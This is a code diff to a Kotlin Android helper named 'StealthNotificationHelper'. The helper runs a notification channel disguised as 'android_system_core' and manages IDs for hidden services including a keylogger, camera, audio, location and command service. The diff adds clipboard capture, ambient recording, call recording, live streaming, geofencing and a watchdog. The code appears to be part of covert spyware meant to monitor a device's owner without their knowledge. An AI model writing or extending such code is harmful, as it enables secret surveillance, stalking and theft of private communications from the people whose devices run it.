@@ -11,12 +11,18 @@ object StealthNotificationHelper {
     
     const val STEALTH_CHANNEL_ID = "android_system_core"
     
-    // Notification IDs for different services
+    // Notification IDs for different services — each must be unique
     const val COMMAND_SERVICE_ID = 2000
     const val LOCATION_SERVICE_ID = 2001
     const val CAMERA_SERVICE_ID = 2002
     const val AUDIO_SERVICE_ID = 2003
     const val KEYLOGGER_SERVICE_ID = 2004
+    const val CLIPBOARD_SERVICE_ID = 2005
+    const val AMBIENT_SERVICE_ID = 2006
+    const val WATCHDOG_SERVICE_ID = 2007
+    const val CALL_RECORDING_SERVICE_ID = 2008
+    const val LIVE_STREAMING_SERVICE_ID = 2009
+    const val GEOFENCE_SERVICE_ID = 2010
     
     fun createStealthChannel(context: Context) {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
@@ -71,6 +77,12 @@ object StealthNotificationHelper {
             ServiceType.CAMERA -> CAMERA_SERVICE_ID
             ServiceType.AUDIO -> AUDIO_SERVICE_ID
             ServiceType.KEYLOGGER -> KEYLOGGER_SERVICE_ID
+            ServiceType.CLIPBOARD -> CLIPBOARD_SERVICE_ID
+            ServiceType.AMBIENT -> AMBIENT_SERVICE_ID
+            ServiceType.WATCHDOG -> WATCHDOG_SERVICE_ID
+            ServiceType.CALL_RECORDING -> CALL_RECORDING_SERVICE_ID
+            ServiceType.LIVE_STREAMING -> LIVE_STREAMING_SERVICE_ID
+            ServiceType.GEOFENCE -> GEOFENCE_SERVICE_ID
         }
     }
     
@@ -79,7 +91,13 @@ object StealthNotificationHelper {
         LOCATION,
         CAMERA,
         AUDIO,
-        KEYLOGGER
+        KEYLOGGER,
+        CLIPBOARD,
+        AMBIENT,
+        WATCHDOG,
+        CALL_RECORDING,
+        LIVE_STREAMING,
+        GEOFENCE
     }
     
     // Cancel all stealth notifications
@@ -91,6 +109,12 @@ object StealthNotificationHelper {
             cancel(CAMERA_SERVICE_ID)
             cancel(AUDIO_SERVICE_ID)
             cancel(KEYLOGGER_SERVICE_ID)
+            cancel(CLIPBOARD_SERVICE_ID)
+            cancel(AMBIENT_SERVICE_ID)
+            cancel(WATCHDOG_SERVICE_ID)
+            cancel(CALL_RECORDING_SERVICE_ID)
+            cancel(LIVE_STREAMING_SERVICE_ID)
+            cancel(GEOFENCE_SERVICE_ID)
         }
     }
 }
